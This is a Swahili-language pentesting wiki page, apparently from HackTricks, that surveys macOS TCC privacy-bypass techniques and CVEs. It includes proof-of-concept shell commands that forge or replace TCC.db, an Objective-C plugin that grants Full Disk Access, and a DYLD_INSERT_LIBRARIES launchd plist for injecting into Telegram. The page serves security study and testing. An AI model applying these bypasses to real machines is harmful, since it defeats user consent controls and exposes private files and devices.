# TCC Bypasses za macOS

{{#include ../../../../../banners/hacktricks-training.md}}

## Kwa utendaji

### Write Bypass

Hii si bypass, ni jinsi TCC inavyofanya kazi: **hailindi dhidi ya kuandika**. Ikiwa Terminal **haina ruhusa ya kusoma Desktop ya mtumiaji, bado inaweza kuandika ndani yake**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
The **extended attribute `com.apple.macl`** huongezwa kwenye **file** mpya ili kuipa **creators app** ruhusa ya kuisoma.

### TCC ClickJacking

Inawezekana **kuweka window juu ya TCC prompt** ili kumfanya mtumiaji **aikubali** bila kutambua. Unaweza kupata PoC kwenye [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Attacker anaweza **kuunda apps zenye jina lolote** (kwa mfano Finder, Google Chrome...) kwenye **`Info.plist`** na kuziomba ruhusa ya kufikia eneo linalolindwa na TCC. Mtumiaji atafikiri kwamba application halali ndiyo inayoomba ruhusa hiyo.\
Zaidi ya hayo, inawezekana **kuondoa app halali kwenye Dock na kuweka fake app humo**, hivyo mtumiaji anapobofya fake app (ambayo inaweza kutumia icon ileile), inaweza kuita app halali, kuomba TCC permissions na kutekeleza malware, na kumfanya mtumiaji aamini kuwa app halali ndiyo iliyoomba ruhusa hiyo.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Maelezo zaidi na PoC kwenye:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Kwa default, access kupitia **SSH ilikuwa na "Full Disk Access"**. Ili kuizima, unahitaji iwe kwenye orodha lakini iwe disabled (kuiondoa kwenye orodha hakutaondoa privileges hizo):

![TCC Request by arbitrary name - SSH Bypass: Kwa default, access kupitia SSH ilikuwa na "Full Disk Access" . Ili kuizima, unahitaji iwe kwenye orodha lakini iwe disabled (kuiondoa...](<../../../../../images/image (1077).png>)

Hapa unaweza kupata mifano ya jinsi baadhi ya **malwares zilivyoweza kubypass protection hii**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Kumbuka kwamba sasa, ili uweze kuwezesha SSH unahitaji **Full Disk Access**

### Handle extensions - CVE-2022-26767

Attribute **`com.apple.macl`** hupewa files ili kuipa **application fulani ruhusa ya kuisoma.** Attribute hii huwekwa wakati wa **drag\&drop** file juu ya app, au mtumiaji anapofanya **double-click** kwenye file ili kuifungua kwa **default application**.

Kwa hiyo, mtumiaji angeweza **kusajili malicious app** ili ishughulikie extensions zote na kuita Launch Services ili **kufungua** file yoyote (hivyo malicious file itapewa ruhusa ya kuisoma).

### iCloud

Entitlement **`com.apple.private.icloud-account-access`** inawezesha kuwasiliana na **`com.apple.iCloudHelper`** XPC service ambayo **itatoa iCloud tokens**.

**iMovie** na **Garageband** zilikuwa na entitlement hii pamoja na nyingine zilizowezesha.

Kwa **maelezo** zaidi kuhusu exploit ya **kupata icloud tokens** kupitia entitlement hiyo, angalia talk: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

App yenye permission ya **`kTCCServiceAppleEvents`** itaweza **kudhibiti Apps nyingine**. Hii inamaanisha kwamba inaweza **kutumia vibaya permissions zilizopewa Apps nyingine**.

Kwa maelezo zaidi kuhusu Apple Scripts angalia:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Kwa mfano, ikiwa App ina **Automation permission juu ya `iTerm`**, kama ilivyo kwenye mfano huu **`Terminal`** ina access juu ya iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, ambayo haina FDA, inaweza kuita iTerm, ambayo inayo, na kuitumia kutekeleza actions:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Kupitia Finder

Au ikiwa App ina access kupitia Finder, inaweza kuendesha script kama hii:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Kwa tabia ya App

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

**`tccd daemon`** ya userland ilikuwa inatumia **`HOME`** **env** variable kufikia database ya TCC ya watumiaji kutoka: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Kulingana na [chapisho hili la Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), na kwa sababu TCC daemon inaendeshwa kupitia **`launchd`** ndani ya domain ya mtumiaji wa sasa, inawezekana **kudhibiti environment variables zote** zinazopelekwa kwake.\
Kwa hivyo, **attacker angeweza kuweka `$HOME` environment** variable katika **`launchctl`** ili kuelekeza kwenye **directory** inayodhibitiwa, **kuanzisha upya** **TCC** daemon, kisha **kubadilisha moja kwa moja TCC database** ili kujipa **kila TCC entitlement** inayopatikana bila kamwe kumwomba end user ruhusa.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes ilikuwa na access kwenye maeneo yaliyolindwa na TCC, lakini note inapoundwa, **huundwa katika eneo lisilolindwa**. Kwa hiyo, ungeweza kuomba Notes inakili file lililolindwa ndani ya note (hivyo katika eneo lisilolindwa), kisha kufikia file hilo:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Binary `/usr/libexec/lsd` yenye library `libsecurity_translocate` ilikuwa na entitlement `com.apple.private.nullfs_allow`, ambayo iliiruhusu kuunda mount za **nullfs**, na ilikuwa na entitlement `com.apple.private.tcc.allow` yenye **`kTCCServiceSystemPolicyAllFiles`** ili kufikia kila file.

Iliwezekana kuongeza attribute ya quarantine kwenye "Library", kuita **`com.apple.security.translocation`** XPC service, kisha inge-map Library kwenda **`$TMPDIR/AppTranslocation/d/d/Library`**, ambako documents zote zilizo ndani ya Library zingeweza **kufikiwa**.

### CVE-2024-44131 - FileProvider symlink race

Apps zinazokabidhi file operations kwa **privileged helper** (hapa **`fileproviderd`** / **`Files.app`**) hunakili au kuhamisha items **kwa niaba ya user**, kwa hiyo copy huendeshwa kwa privileges za helper badala ya caller.

Jamf Threat Labs ilionyesha kuwa symlink validation inayofanywa kabla ya operation inaweza kufanyiwa **race**: badala ya kuweka symlink kwenye path component ya **mwisho** (ambayo hukaguliwa), attacker hubadilisha directory ya **katikati** ya path **baada ya copy kuanza**. Kisha privileged helper hufuata link inayodhibitiwa na attacker na kusoma/kuandika maeneo yaliyolindwa na TCC **bila kuonyesha prompt hata mara moja**.

Directories ambazo **hazijalindwa** na UUID random katika path yao (kwa mfano `~/Library/Mobile Documents/com~apple~CloudDocs`) ndizo targets rahisi zaidi, kwa sababu attacker anaweza kutabiri path kamili ya kufanyia race.

> [!TIP]
> Huu ni muundo wa jumla wa kutafuta: **process yoyote yenye privileges inayoresolve path zaidi ya mara moja** (check-then-use, au `rename()`/`copyfile()` inayoresolve source na destination kando) inaweza kufanyiwa race kwa kubadilisha directory iliyo katikati ya path. Ni `O_NOFOLLOW_ANY`, `openat()` kwenye directory FD ambayo tayari imefunguliwa, au `realpath()` + re-validation pekee ndizo zinazofunga pengo hilo.

Maelezo zaidi kwenye [**ripoti ya Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).

### SQLITE_SQLLOG_DIR

`libsqlite3` inaweza ku-buildiwa na `SQLITE_ENABLE_SQLLOG`, ambayo huongeza logging hook inayoendeshwa na environment variables ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):

- **`SQLITE_SQLLOG_DIR=path`** – kwa **kila database inayofunguliwa**, **copy ya database file** na log ya SQL statements huandikwa kwenye `path` (directory lazima iwepo tayari).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – chukua copy **mpya kila mara** DB inapofunguliwa/ku-attach badala ya kutumia tena iliyopo.
- **`SQLITE_SQLLOG_CONDITIONAL`** – log connection ikiwa tu file la `<database>-sqllog` lipo karibu na main DB.

Ikiwa unaweza ku-inject variable hii kwenye process yenye **FDA** na inayofungua SQLite databases, itanakili kwa urahisi **databases hizo zilizolindwa** kwenye directory unayodhibiti. Kwa sababu jina la destination filename linatokana na data inayodhibitiwa na attacker, **symlink iliyowekwa kwenye destination** hubadilisha primitive hiyo hiyo kuwa **arbitrary file write** kwa kutumia privileges za target process.

### **SQLITE_AUTO_TRACE**

Ikiwa environment variable **`SQLITE_AUTO_TRACE`** imewekwa, library **`libsqlite3.dylib`** itaanza **kulog** SQL queries zote. Applications nyingi zilitumia library hii, kwa hiyo iliwezekana kulog SQLite queries zao zote.

Applications kadhaa za Apple zilitumia library hii kufikia taarifa zilizolindwa na TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Hunting for env-var driven file writes

Entries mbili zilizotangulia ni mifano ya technique generic ileile, na inafaa kutafuta zaidi: **frameworks zinazopakiwa kwenye TCC-privileged apps mara nyingi hufichua environment variables za debug/logging zinazofanya process itengeneze file kwenye path inayodhibitiwa na caller**.

Workflow ya kuzipata:

1. Chagua target yenye FDA au TCC permission nyingine yenye thamani (`Music`, `TV`, `Terminal`, MDM agents...) na orodhesha frameworks inazounganisha (`otool -L`, `vmmap`).
2. Tafuta strings za `getenv` kwenye frameworks hizo: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Weka candidate variables kupitia `launchctl setenv NAME /path/you/control`, fungua app na uangalie inachofanya kwenye filesystem kwa `fs_usage -w -f filesys <pid>` au `sudo fs_usage | grep <path>`.
4. Ikiwa process **inatengeneza au kubadilisha jina** la file kwenye directory yako, una write primitive: elekeza destination kwenye symlink (au fanya race kwenye directory ya kati, kama ilivyo kwenye CVE-2024-44131 hapo juu) ili kuipeleka kwenye `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Vitu viwili vinaweka kikomo hapa. Kwanza, variables za **`DYLD_*`** hupuzwa kwa binaries zenye hardened-runtime **isipokuwa** app ina entitlement ya [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) ("a Boolean value that indicates whether the app may be affected by dynamic linker environment variables, which you can use to inject code into your app's process") — tazama pia [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Pili, Apple huondoa individual framework debug variables zinaporipotiwa, kwa hiyo variable iliyofanya kazi kwenye macOS release moja mara nyingi huwa haipo kwenye inayofuata. Ikiwa app inakataa kufunguka kimya baada ya kuiweka, ichukulie variable hiyo kuwa tayari imechujwa.

Tazama [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) kwa trick inayolingana na hii inayotumia linker variables.

### Apple Remote Desktop

Ukiwa root unaweza kuwezesha service hii, na **ARD agent itakuwa na full disk access**, ambayo mtumiaji anaweza kuitumia vibaya kuifanya inakili **TCC user database** mpya.

## By **NFSHomeDirectory**

TCC hutumia database kwenye HOME folder ya user kudhibiti access kwa resources maalum za user kwenye **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Kwa hiyo, ikiwa user ataweza kuanzisha upya TCC kwa kutumia $HOME env variable inayoelekeza kwenye **folder tofauti**, user anaweza kuunda TCC database mpya kwenye **/Library/Application Support/com.apple.TCC/TCC.db** na kuudanganya TCC itoe TCC permission yoyote kwa app yoyote.

> [!TIP]
> Kumbuka kwamba Apple hutumia setting iliyohifadhiwa ndani ya profile ya user kwenye attribute ya **`NFSHomeDirectory`** kama **value ya `$HOME`**, kwa hiyo, ikiwa uta-compromise application yenye permissions za kubadilisha value hii (**`kTCCServiceSystemPolicySysAdminFiles`**), unaweza **weaponize** option hii kwa TCC bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**POC ya kwanza** hutumia [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) na [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) kubadilisha **HOME** folder ya user.

1. Pata _csreq_ blob ya target app.
2. Panda file bandia ya _TCC.db_ yenye access inayohitajika na _csreq_ blob.
3. Export Directory Services entry ya user kwa [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Badilisha Directory Services entry ili kubadilisha home directory ya user.
5. Import Directory Services entry iliyobadilishwa kwa [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Simamisha user’s _tccd_ na reboot process.

POC ya pili ilitumia **`/usr/libexec/configd`**, ambayo ilikuwa na `com.apple.private.tcc.allow` yenye value `kTCCServiceSystemPolicySysAdminFiles`.\
Iliwezekana ku-run **`configd`** kwa option ya **`-t`**, ambapo attacker angeweza kubainisha **custom Bundle ya kupakia**. Kwa hiyo, exploit **inabadilisha** method ya **`dsexport`** na **`dsimport`** ya kubadilisha home directory ya user kwa **`configd` code injection**.

Kwa maelezo zaidi tazama [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## By process injection

Kuna techniques tofauti za ku-inject code ndani ya process na kutumia vibaya TCC privileges zake:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Zaidi ya hayo, process injection inayopatikana mara nyingi zaidi kwa bypass TCC ni kupitia **plugins (load library)**.\
Plugins ni code ya ziada, kwa kawaida ikiwa katika mfumo wa libraries au plist, ambayo **itapakiwa na main application** na kutekelezwa chini ya context yake. Kwa hiyo, ikiwa main application ilikuwa na access kwa files zilizozuiwa na TCC (kupitia permissions au entitlements zilizotolewa), **custom code pia itakuwa nayo**.

### CVE-2020-27937 - Directory Utility

Application `/System/Library/CoreServices/Applications/Directory Utility.app` ilikuwa na entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, ilipakia plugins zenye extension ya **`.daplug`** na **haikuwa na hardened** runtime.

Ili ku-weaponize CVE hii, **`NFSHomeDirectory`** **hubadilishwa** (kwa kutumia entitlement ya awali vibaya) ili kuweza **kuchukua udhibiti wa TCC databases za users** na kubypass TCC.

Kwa maelezo zaidi tazama [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** ilikuwa na entitlements `com.apple.security.cs.disable-library-validation` na `com.apple.private.tcc.manager`. Ya kwanza **iliruhusu code injection**, na ya pili iliipa access ya **kusimamia TCC**.

Binary hii iliruhusu kupakia **third party plug-ins** kutoka folder `/Library/Audio/Plug-Ins/HAL`. Kwa hiyo, iliwezekana **kupakia plugin na kutumia vibaya TCC permissions** kwa POC hii:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Kwa maelezo zaidi angalia [**ripoti ya awali**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Device Abstraction Layer (DAL) Plug-Ins

System applications zinazofungua camera stream kupitia Core Media I/O (apps zenye **`kTCCServiceCamera`**) hupakia **plugins hizi ndani ya process** zilizo kwenye `/Library/CoreMediaIO/Plug-Ins/DAL` (hazizuiliwi na SIP).

Kuweka tu library yenye **constructor** ya kawaida humo kutafanya kazi ya **kuingiza code**.

Apple applications kadhaa zilikuwa vulnerable kwa hili.

### Firefox

Firefox application ilikuwa na entitlements za `com.apple.security.cs.disable-library-validation` na `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Kwa maelezo zaidi kuhusu jinsi ya kutumia hii kwa urahisi [**angalia report ya awali**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` ilikuwa na entitlements **`com.apple.private.tcc.allow`** na **`com.apple.security.get-task-allow`**, ambazo ziliruhusu kuingiza code ndani ya process na kutumia privileges za TCC.

### CVE-2023-26818 - Telegram

Telegram ilikuwa na entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** na **`com.apple.security.cs.disable-library-validation`**, hivyo iliwezekana kuitumia vibaya ili **kupata access kwa permissions zake**, kama vile kurekodi kwa kutumia camera. Unaweza [**kupata payload katika writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Kumbuka jinsi env variable ilivyotumiwa kupakia library: **custom plist** iliundwa kuingiza library hii, na **`launchctl`** ilitumika kui-launch:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## By open invocations

Inawezekana kuendesha **`open`** hata ukiwa ndani ya sandbox

### Terminal Scripts

Ni jambo la kawaida kuwapa terminal **Full Disk Access (FDA)**, hasa kwenye kompyuta zinazotumiwa na watu wa tech. Na inawezekana kuendesha scripts za **`.terminal`** pamoja nayo.

**`.terminal`** scripts ni faili za plist kama hii, zikiwa na command ya kutekeleza kwenye key ya **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Programu inaweza kuandika terminal script katika eneo kama vile /tmp na kuizindua kwa amri kama vile:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Kwa kutumia mount

### CVE-2020-9771 - mount_apfs TCC bypass na privilege escalation

**Mtumiaji yeyote** (hata wasio na privileges) anaweza kuunda na ku-mount snapshot ya time machine na **kufikia faili ZOTE** za snapshot hiyo.\
**Privilege pekee inayohitajika** ni kwa application inayotumika (kama `Terminal`) kuwa na **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`), ambayo inahitaji kutolewa na admin.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Maelezo ya kina zaidi yanaweza [**kupatikana katika report ya awali**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

Hata kama TCC DB file inalindwa, iliwezekana **ku-mount juu ya directory** TCC.db file mpya:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Check the **full exploit** in the [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Kama ilivyoelezwa katika [original writeup](https://www.kandji.io/blog/macos-audit-story-part2), CVE hii ilitumia vibaya `diskarbitrationd`.

Function `DADiskMountWithArgumentsCommon` kutoka kwenye framework ya umma ya `DiskArbitration` ilifanya ukaguzi wa usalama. Hata hivyo, inawezekana kuikwepa kwa kuita moja kwa moja `diskarbitrationd` na hivyo kutumia vipengele vya `../` kwenye path pamoja na symlinks.

Hii ilimruhusu mshambuliaji kufanya mounts kiholela katika eneo lolote, ikiwemo juu ya TCC database kutokana na entitlement `com.apple.private.security.storage-exempt.heritable` ya `diskarbitrationd`.

### asr

Tool **`/usr/sbin/asr`** iliruhusu kunakili disk nzima na kui-mount mahali pengine, hivyo kukwepa protections za TCC.

### Location Services

Kuna TCC database ya tatu katika **`/var/db/locationd/clients.plist`** inayoonyesha clients walioruhusiwa **kufikia location services**.\
Folder **`/var/db/locationd/` haikulindwa dhidi ya DMG mounting**, hivyo iliwezekana ku-mount plist yetu wenyewe.

## Kupitia startup apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Kupitia grep

Katika matukio kadhaa, mafaili huhifadhi taarifa nyeti kama barua pepe, nambari za simu, ujumbe... katika maeneo yasiyolindwa (ambayo Apple huyahesabu kama vulnerability).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Hii haifanyi kazi tena, lakini [**did in the past**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Njia nyingine inayotumia [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Marejeo

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [**Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [**SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)**](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [**Apple - Allow DYLD environment variables entitlement**](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [**The Eclectic Light Company - Notarization: the hardened runtime**](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)

{{#include ../../../../../banners/hacktricks-training.md}}
